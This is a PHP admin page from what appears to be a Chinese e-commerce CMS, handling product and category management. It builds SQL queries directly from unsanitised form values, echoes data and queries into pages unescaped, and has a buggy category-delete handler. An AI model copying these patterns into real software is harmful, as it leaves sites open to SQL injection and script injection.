$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$somodeids." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($row_edit['sort_id']==$rsmainc['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select></td>
</tr>
<tr>
<td align=right height=25>名称 &nbsp; </td>
<td><input name="productstitle2" type="text" id="productstitle2" value="<?php echo $row_edit['name'] ?>" size="30">    </td>
</tr>
<tr>
<td align=right height=25>编号&nbsp; </td>
<td><input name="name1" type="text" id="name1" value="<?php echo $row_edit['name1'] ?>" size="30">    </td>
</tr>
<tr>
<td align=right height=25>售价 &nbsp; </td>
<td><input name="num" type="text" id="num" value="<?php echo $row_edit['num'] ?>" size="30">
数量1件起卖</td>
</tr>
<tr>
<td align=right height=25>缩略小图片 &nbsp; </td>
<td><input name="photo" type="text" id="photo" value="<?php echo $row_edit['pic'] ?>"  size="30">
<input type="button" name="Submit11" value="上传缩略图" onClick="window.open('./upload.php?formname=myform&editname=photo&uppath=pic&filelx=jpg','','status=no,scrollbars=no,top=20,left=110,width=400,height=100')"></td>
</tr>
<tr>
<td align=right height=25>目前状态 &nbsp; </td>
<td><input type="checkbox" name="hot" value="1" style="border:0px;" <?php if ($row_edit['hot']){echo " checked='checked'";}?>>热门商品 <input type="checkbox" name="new" value="1" style="border:0px;" <?php if ($row_edit['new']){echo " checked='checked'";}?>>新品上市 <input type="checkbox" name="tj" value="1" style="border:0px;" <?php if ($row_edit['tj']){echo " checked='checked'";}?>>推荐商品
<input type="checkbox" name="pass" value="1" style="border:0px;" <?php if ($row_edit['pass']){echo " checked";}?>>上架</td>
</tr>
<tr>
<td width='20%' align=right height=25>添加或修改时间　 </td>
<td>添加日期：<?php echo $row_edit['date'] ?> 添加人：<?php echo $row_edit['username'] ?> &nbsp;&nbsp;&nbsp;修改日期：
<?php $mdate=$row_edit['mdate']; if ($mdate==NULL){echo("未修改");}else{echo $mdate;} ?></td>
</tr>
<tr>
<td align=right height=25>产品介绍　</td>
<td>&nbsp;</td>
</tr>
<tr>
<td height=25 colspan="2" >
<div class="table">
<div class="title">
<table cellspacing="0" cellpadding="0">
<tr>
<td height="25">内容<span class="darkblue">[content]</span>：</td>
<td><span class="note"></span></td>
</tr>
</table>
</div>
<div class="content">
<script id="content" type="text/plain" style="width:900px;height:360px"><?php echo $row_edit['content']; ?></script>
<script type="text/javascript">
var toolbars_161 = [[
'fullscreen','source','|','undo', 'redo', '|',
'bold', 'italic', 'underline', 'fontborder', 'strikethrough', 'superscript', 'subscript','|',
'justifyleft', 'justifycenter', 'justifyright', '|',
'removeformat', 'autotypeset', 'blockquote', 'pasteplain', '|',
'forecolor', 'backcolor', 'insertorderedlist', 'insertunorderedlist', 'lineheight', '|',
'touppercase', 'tolowercase','inserttable','horizontal','|',
'link', 'unlink', 'anchor',
'|','insertimage',	'paragraph', 'fontfamily', 'fontsize','insertcode',
'indent','|',
'imagenone', 'imageleft', 'imageright', 'imagecenter', '|',
'date', 'time', 'spechars',
'wordimage', '|',
'insertvideo',	'attachment',		'|',	'background','preview', 'searchreplace','help'
]];
</script>
<script type="text/javascript">
var edit_config_161 = {
'UEDITOR_HOME_URL':webroot+'js/ueditor/'
,'serverUrl':get_url('ueditor')
,'toolbars':toolbars_161	//扩展字段
,'labelMap':{'phpokinfo':'主题库'}
//初始化宽度
,'initialFrameWidth':'900'
//允许使用DIV
,'allowDivTransTop': false
//初始化高度
,'initialFrameHeight':'360'
,'sourceEditorFirst':false	,'readonly':false	,'pasteplain':false	,'autoFloatEnabled':false
,'autoHeightEnabled':false
,'pageBreakTag':'[:page:]'
,'textarea':'content'
,'iframeUrlMap':{
'phpokinfo':get_url('ueditor','info')
}
};
var edit_161 = UE.getEditor('content',edit_config_161);
</script>
</div>
</div>
</td>
</tr>
<tr><td colspan=2>
<input name="id" type="hidden" value="<?php echo $row_edit['pid'] ?>">
<input type="submit" name="Submit" value="确认修改">&nbsp;&nbsp;</td></tr>
</form>
</table>
<?php
}//end while
mysql_free_result($edit_data);
}//end act?>
<?php
/*==================================================================
********************************************************************
**************************产品颜色与图片管理************************
********************************************************************
====================================================================
c_list  颜色目录
c_del   颜色删除(数据库操作)
c_add   颜色添加(数据库操作)
c_edit  颜色编辑
c_edit1 颜色编辑(数据库操作)
pcolor表
id pid minpic maxpic color
*/
if ($action=="c_list"){
?>
<?php
}//end act
?>
<?php
if ($action=="b_edit"){
$px=$_POST['pxnid']+0;
$web_title=$_POST['web_title'];
$web_content=$_POST['web_content'];
$web_tags=$_POST['web_tags'];
$areaid=$_POST['area_id']+0;
$name=$_POST['productstitle2'];
$pic=$_POST['photo'];
$maxpic=$_POST['maxpic'];
$name1=$_POST['name1'];
$sort_id=$_POST['sort_id']+0;
// 多选 if (!empty($_POST['sort_id'])){foreach ($_POST['sort_id'] as $key2){$sort_id.=$key2."||";}}
$fandj=0;
$click=$_POST['click']+0;
if($_POST['click']==""){$click=0;}else{$click=$_POST['click'];} //新品
$content=$_POST['content'];
$content1=$_POST['content1'];
$sortcontent=$_POST['sortcontent'];
$num=$_POST['num']+0;  //原价
$vipnum=$_POST['vipnum']+0;  //会员价
$chunum=$_POST['chunum']+0;  //促销价
if($_POST['pass']==""){$pass=0;}else{$pass=$_POST['pass'];} //新品
if($_POST['tj']==""){$tj=0;}else{$tj=$_POST['tj'];}     //推荐
if($_POST['hot']==""){$hot=0;}else{$hot=$_POST['hot'];} //热点
if($_POST['new']==""){$new=0;}else{$new=$_POST['new'];} //新品
if ( $name=="" | $sort_id==""){
echo "<script language='javascript'>";
echo "alert('不能为空!');";
echo "location.href='javascript:history.go(-1)';";
echo "</script>";
}
else
{
$update_edit="update products set px='$px' ,name='$name',name1='$name1',sort_id='$sort_id',pic='$pic',maxpic='$maxpic',content='$content',content1='$content1',sortcontent='$sortcontent',date='".date("Y-m-d H:i:s")."',tj='$tj',fandj='$fandj',click='$click',pass='$pass',new='$new',hot='$hot',num='$num'  where pid=$pid";
//echo $update_edit;
$update_result=$lnk -> query($update_edit) or die( mysql_error());
echo "<script language='javascript'>";
echo "alert('操作成功，已修改!');";
echo "location.href='products_body.php?sortid=".$_SESSION['sortcid']."';";
echo "</script>";
}
}
?>
<?php
/* +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
删除数据开始 */
$delact=$_REQUEST['act'];
if ($delact=="del")
{
$numb1=$_REQUEST['num'];
if (!is_array($numb1)){$numb[0]=$numb1;}else{$numb=$numb1;}
if (!empty($numb))
foreach($numb as $num)
{
$delsoid="DELETE from products where pid in (".$num.")";
$resultdel=$lnk -> query($delsoid) or die (mysql_error());
}
echo "<script language='javascript'>";
echo "alert('您选择的已删除！');";
echo "location.href='products_body.php?sortid=".$_SESSION['sortcid']."';";
echo "</script>";
if(empty($numb)){
echo "<script language='javascript'>";
echo "alert('出错了，您什么也没有选择！');";
echo "location.href='products_body.php?sortid=".$_SESSION['sortcid']."';";
echo "</script>";
}
}//end if(act=del)
?>
<?php
if ($action=="add"){ ?>
<table width="98%" border="1"style="border-collapse: collapse; border-style: dotted; border-width: 0px"bordercolor="#278296" cellspacing="0" cellpadding="2">
<form name="myform" action="products_body.php?act=addn" method="post">
<tr>
<td colspan=2 class=td height=25>添加/ADDNEW<?php echo $modename?> &nbsp;</td>
</tr>
<tr>
<td width="137" height=25 align=right>排序&nbsp; </td>
<td><input name="pxnid" type="text" id="pxnid" value="0" size="20"></td>
</tr>
<tr>
<td align=right height=25>分类 &nbsp;</td>
<td><select name='sort_id' size='1' id='sort_id' style="border:1px solid  #8FB9CB;height:21px;"><?php
$sql="select * from sort where type_id=0 and list_id=".$somodeids." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if ($_SESSION['sortcid']==$rsmain['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$somodeids." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if ($_SESSION['sortcid']==$rsmaina['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$somodeids." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if ($_SESSION['sortcid']==$rsmainb['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$somodeids." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($_SESSION['sortcid']==$rsmainc['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select></td>
</tr>
<tr>
<td align=right height=25>名称 &nbsp; </td>
<td><input name="name" type="text" id="name" value="" size="30">      </td>
</tr>
<tr>
<td align=right height=25>编号&nbsp; </td>
<td><input name="name1" type="text" id="name1" value="" size="30">    </td>
</tr>
<tr>
<td align=right height=25>原价 &nbsp; </td>
<td><input name="num" type="text" id="num" value="" size="30">
数量1件起卖</td>
</tr>
<tr>
<td align=right height=25>缩略小图片 &nbsp; </td>
<td><input name="photo" type="text" id="photo" value="" size="30">
<input type="button" name="Submit11" value="上传缩略图" onClick="window.open('./upload.php?formname=myform&editname=photo&uppath=pic&filelx=jpg','','status=no,scrollbars=no,top=20,left=110,width=400,height=100')"></td>
</tr> <tr>
<td align=right height=25>目前状态 &nbsp; </td>
<td>
<input type="checkbox" name="hot" value="1" style="border:0px;">热门商品 <input type="checkbox" name="new" value="1" style="border:0px;">新品上市 <input type="checkbox" name="tj" value="1" style="border:0px;">推荐商品 <input name="pass" type="checkbox" style="border:0px;" value="1" checked >上架</td></td>
</tr>
<tr>
<td align=right height=25>产品介绍　</td>
<td>&nbsp;</td>
</tr>
<tr>
<td height=25 colspan="2" ><?php
include("editor/fckeditor.php");
$oFCKeditor = new FCKeditorx('content') ;
$oFCKeditor->Value = "请这里输入商品描述";
//$oFCKeditor->ToolbarSet = 'Basic';
$oFCKeditor->Create() ;
?></td>
</tr>
<tr>
<td colspan=2>
<input type="submit" name="Submit2" value="确认添加">
&nbsp;&nbsp;</td>
</tr>
</form>
</table>
<?php } ?>
<?php
if ($action=="addn"){
for($i=1;$i<30;$i++){
empty($t)? $fgf="":$fgf="|||";
$ii="t".$i;
$iii="tt".$i;
if ($_POST[$ii])
is_array($_POST[$ii])? $t.=$fgf.$_POST[$iii].":::".implode(",",$_POST[$ii]):$t.=$fgf.$_POST[$iii].":::".$_POST[$ii];
}
$pro_info=$t;//属性组
$px=$_POST['pxnid']+0; //排序
$name=$_POST['name']; //名称
$name1=$_POST['name1']; //编号
$pic=$_POST['photo'];  //小图
$sort_id=$_POST['sort_id']+0; //分类
$web_title=$_POST['web_title'];
$web_content=$_POST['web_content'];
$web_tags=$_POST['web_tags'];
//if (!empty($_POST['sort_id'])){foreach ($_POST['sort_id'] as $key){$sort_id.=$key."||";}}
$maxpic=$_POST['maxpic'];  //大图
$list_id=$_SESSION['classid']+0;  //关联目录
$main_id= getIdMianId($_SESSION['classid']+0);  //关联主目录
$content=$_POST['content']; //介绍
$content1=$_POST['content1']; //介绍
$sortcontent=$_POST['sortcontent']; //短文
$size=$_POST['size'];  //尺寸
if($_POST['area_id']==""){$area_id=0;}else{$area_id=$_POST['area_id'];} //产地
if($_POST['pass']==""){$pass=0;}else{$pass=$_POST['pass'];} //新品
if($_POST['tj']==""){$tj=0;}else{$tj=$_POST['tj'];}     //推荐
if($_POST['hot']==""){$hot=0;}else{$hot=$_POST['hot'];} //热点
if($_POST['new']==""){$new=0;}else{$new=$_POST['new'];} //新品
$num=$_POST['num']+0;  //市场价
$fandj=0;
$click=$_POST['click']+0;  //喜欢
$vipnum=$_POST['vipnum']+0;  //会员价
$chunum=$_POST['chunum']+0;  //促销价
$qiangnum=$_POST['qiangnum']+0;  //折扣价
$hd=$_POST['hd']+0;  //市场价
if(!$sort_id){alert("请选择一个类！");goback();}
if ($name=="" | $content==""){
echo "<script language='javascript'>";
echo "alert('不能为空!');";
echo "location.href='javascript:history.go(-1)';";
echo "</script>";
}
else
{
$insert_data="insert into  products (px,name,name1,sort_id,list_id,main_id,pic,maxpic,content,content1,sortcontent,date,username,tj,hot,new,fandj,click,pass,num) values ('$px','$name','$name1','$sort_id','$list_id','$main_id','$pic','$maxpic','$content','$content1','$sortcontent','".date("Y-m-d H:i:s")."','$uname_admin','$tj','$hot','$new','$fandj','$click','$pass','$num')";
//echo $insert_data;
$insert_result=$lnk -> query($insert_data) or die(mysql_error());
echo "<script language='javascript'>";
echo "alert('插入成功!');";
echo "location.href='products_body.php?sortid=".$_SESSION['sortcid']."';";
echo "</script>";
}
}
?>
<?php
//rem 产品种类删除
if ($action=="delsort"){
$num=$_POST['sortid'];
$delsoid="delete from sort where id in (".sqlsortid($num,"start").")";
echo $delsoid;
$resultdel=$lnk -> query($delsoid) or die ( mysql_error());
$delsoid2="delete from products where sort_id in (".sqlsortid($num,"start").")";
echo $delsoid2;
$resultdel2=$lnk -> query($delsoid) or die ( mysql_error());
alert('操作成功，种类成功删除,并删除所有此类产品');
goback();
}
if ($action=="addmenu"){
$px=$_POST['px']+0;
$sortname=$_POST['sortname'];
$pic=@$_POST['photo'];
$area=@	$_POST['area_id'];
$sortid=$_POST['sortid'];
$list_id=$classid;
$main_id=getIdMianId($classid);
if ($sortname==""){
alert('不能为空!');
goback();
}
else
{
$insert_data="insert into sort (px,sort_name,type_id,list_id,main_id,pic) values ('$px','$sortname','0','$list_id','$main_id','$pic')";
echo $insert_data;
$insert_result=$lnk -> query($insert_data) or die(mysql_error());
alert('插入成功!');
go("products_body.php?act=sortmenu");
}
if ($action=="delsort"){
$num=$_POST['num'];
$delsoid="delete from sort where sort_id in (".sqlsortid($num,"start").")";
echo $delsoid;
$resultdel=$lnk -> query($delsoid) or die ( mysql_error());
$delsoid2="delete from products where sort_id in (".sqlsortid($num,"start").")";
$resultdel2=$lnk -> query($delsoid) or die ( mysql_error());
alert('操作成功，种类成功删除,并删除所有此类产品');
goback();
}
}
if ($action=="addminmenu"){
$px=$_POST['px']+0;
$sortname=$_POST['sortname'];
$pic=@$_POST['photo'];
$area=@$_POST['area_id'];
$sortid=$_POST['sortid'];
$list_id=$classid;
$main_id=getIdMianId($classid);
if ($sortname==""){
alert('不能为空!');
goback();
}
else
{
$insert_data="insert into sort (px,sort_name,type_id,list_id,main_id,pic) values ('$px','$sortname','$sortid','$list_id','$main_id','$pic')";
echo $insert_data;
$insert_result=$lnk -> query($insert_data) or die(mysql_error());
alert('插入成功!');
go("products_body.php?act=sortmenu");
}
}
if ($action=="sortmenu"){
?>
<table class="width98 table table-striped table-bordered table-hover js-table" data-toggle="table" data-url="" data-height="299" data-click-to-select="true"  data-select-item-name="radioName" id="table-ShipChk">
<tr>
<td class=td height=18>种类列表</td>
</tr>
<tr>
<td height=25> <form name="form1" method="post" action="products_body.php?act=addmenu">
<select name='listid' size='1' id='listid' style="border:1px solid  #8FB9CB;height:21px;">
<?php
$sql="select * from mainbt1 where typea=2 order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id']." style='font-size:12px;font-weight:bold'>".$rsmain['leftname']."</option>";
}?>
</select>
<select name='sortid' size='1' id='sortid' style="border:1px solid  #8FB9CB;height:21px;"><?php
$sql="select * from sort where type_id=0 and list_id=".$classid." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if (@$_SESSION['sortcid']==$rsmain['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$classid." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if (@$_SESSION['sortcid']==$rsmaina['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$classid." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if ($_SESSION['sortcid']==$rsmainb['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$classid." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($_SESSION['sortcid']==$rsmainc['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select> <input name="sortname" type="text" id="sortname" size="20" style="border:1px solid  #8FB9CB;height:21px;">
<label></label>
<input name="px" type="text" id="px" value="0" size="5" style="border:1px solid  #8FB9CB;height:21px;">
<label>
<input type="submit" name="Submit" value="添加根目录" style="border:1px solid  #8FB9CB;height:21px;">
</label></form></td>
</tr>
<tr>
<td height=25> <form name="form2" method="post" action="products_body.php?act=addminmenu"><select name='sortid' size='1' id='sortid' style="border:1px solid  #8FB9CB;height:21px;"><?php
$sql="select * from sort where type_id=0 and list_id=".$classid." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if (@$_SESSION['sortcid']==$rsmain['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$classid." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if (@$_SESSION['sortcid']==$rsmaina['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$classid." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if ($_SESSION['sortcid']==$rsmainb['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$classid." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($_SESSION['sortcid']==$rsmainc['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select>
<input name="sortname" type="text" id="sortname" size="20" style="border:1px solid  #8FB9CB;height:21px;">
<label></label>
<input name="px" type="text" id="px" value="0" size="5" style="border:1px solid  #8FB9CB;height:21px;">
<label>
<input type="submit" name="Submit" value="添加子目录" style="border:1px solid  #8FB9CB;height:21px;">
</label></form></td>
</tr>
<tr>
<td height=25> <form name="form434" method="post" action="products_body.php?act=delsort"><select name='sortid' size='1' id='sortid' style="border:1px solid  #8FB9CB;height:21px;"><?php
$sql="select * from sort where type_id=0 and list_id=".$classid." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if (@$_SESSION['sortcid']==$rsmain['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$classid." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if (@$_SESSION['sortcid']==$rsmaina['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$classid." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if ($_SESSION['sortcid']==$rsmainb['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$classid." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($_SESSION['sortcid']==$rsmainc['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select>
<label>
<input type="submit" name="Submit" value="删除当前及下级所有目录" style="border:1px solid  #8FB9CB;height:21px;" onClick="return confirm('您确定要这样操作吗？')">
</label></form></td>
</tr> <tr>
<td height=25> <form name="form334" method="post" action="products_body.php?act=editsort"><select name='sortid' size='1' id='sortid' style="border:1px solid  #8FB9CB;height:21px;" onChange="javascript:document.forms('form334').sortname.value=this.options[this.options.selectedIndex].text;document.forms('form334').px.value=this.options[this.options.selectedIndex].px;document.forms('form334').photo.value=this.options[this.options.selectedIndex].pic;if(this.options[this.options.selectedIndex].sex==2){document.forms('form334').sex[1].checked=true;}else{document.forms('form334').sex[0].checked=true;}"><?php
$sql="select * from sort where type_id=0 and list_id=".$classid." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if (@$_SESSION['sortcid']==$rsmain['id']){echo (" selected");}
echo " px='".$rsmain['px']."' sex='".@$rsmain['sex']."'  pic='".$rsmain['pic']."'  style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$classid." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if (@$_SESSION['sortcid']==$rsmaina['id']){echo (" selected");}
echo " px='".$rsmaina['px']."'  sex='".@$rsmaina['sex']."'   pic='".$rsmaina['pic']."'  style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$classid." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if (@$_SESSION['sortcid']==$rsmainb['id']){echo (" selected");}
echo " px='".$rsmainb['px']."'  sex='".$rsmainb['sex']."'  pic='".$rsmainb['pic']."'  style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
$sql="select * from sort where type_id=".$rsmainb['id']." and list_id=".$classid." order by px";
$rsmainc1=$lnk -> query($sql);
while($rsmainc=mysqli_fetch_assoc($rsmainc1)){
echo  "<option value=".$rsmainc['id'];
if ($_SESSION['sortcid']==$rsmainc['id']){echo (" selected");}
echo " px='".$rsmainc['px']."'  sex='".$rsmainc['sex']."'  pic='".$rsmainc['pic']."' style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainc['id'],0);
$i="";
echo $rsmainc['sort_name']."</option>";
if (MenuDown($rsmainc['id'])){
}}
//四级分类结束
}}
//三级目录结束
}}
//二级目录结束
}}
?></select>
<input name="sortname" type="text" id="sortname" style="border:1px solid  #8FB9CB;height:21px;" value="<?php echo sortid_sortname(@$_SESSION['sortcid']);?>" size="20"><label></label>
<input name="px" type="text" id="px" value="<?php echo sortid_sortpx(@$_SESSION['sortcid']);?>" size="5" style="border:1px solid  #8FB9CB;height:21px;">
<label>
<input type="submit" name="Submit" value="修改当前目录名称" style="border:1px solid  #8FB9CB;height:21px;" onClick="return confirm('您确定要这样操作吗？')">
</label><br>
<script>
function shuaimg(){
document.getElementById("minpic2_c").src="../admin/temp/"+document.form334.photo.value;
}
var d1=window.setInterval("shuaimg()",1000);
</script></form>
</td>
</tr>
</table>
<?php
}
//rem 种类修改
if ($action=="editsort"){
$px=$_POST['px'];
$sortname=$_POST['sortname'];
$pic=$_POST['photo'];
$sortid=$_POST['sortid'];
$sex=$_POST['sex']+0;
if ($sortname==""){
alert('名称不能为空!');
goback();
}
else
{
$update_edit="update sort set px='$px',sort_name='$sortname',pic='$pic',sex='$sex' where id=$sortid";
//echo $update_edit;
$update_result=$lnk -> query($update_edit);
alert('修改成功!');
goback();
}
}?>
<script>
var rDrag = {
o:null,
init:function(o){
o.onmousedown = this.start;
},
start:function(e){
var o;
e = rDrag.fixEvent(e);
e.preventDefault && e.preventDefault();
rDrag.o = o = this;
o.x = e.clientX - rDrag.o.offsetLeft;
o.y = e.clientY - rDrag.o.offsetTop;
document.onmousemove = rDrag.move;
document.onmouseup = rDrag.end;
},
move:function(e){
e = rDrag.fixEvent(e);
var oLeft,oTop;
oLeft = e.clientX - rDrag.o.x;
oTop = e.clientY - rDrag.o.y;
rDrag.o.style.left = oLeft + 'px';
rDrag.o.style.top = oTop + 'px';
},
end:function(e){
e = rDrag.fixEvent(e);
rDrag.o = document.onmousemove = document.onmouseup = null;
},
fixEvent: function(e){
if (!e) {
e = window.event;
e.target = e.srcElement;
e.layerX = e.offsetX;
e.layerY = e.offsetY;
}
return e;
}
}
window.onload = function(){
var obj = document.getElementById('proshow');
rDrag.init(obj);
}
</script>
<br><br><br><br><br><br>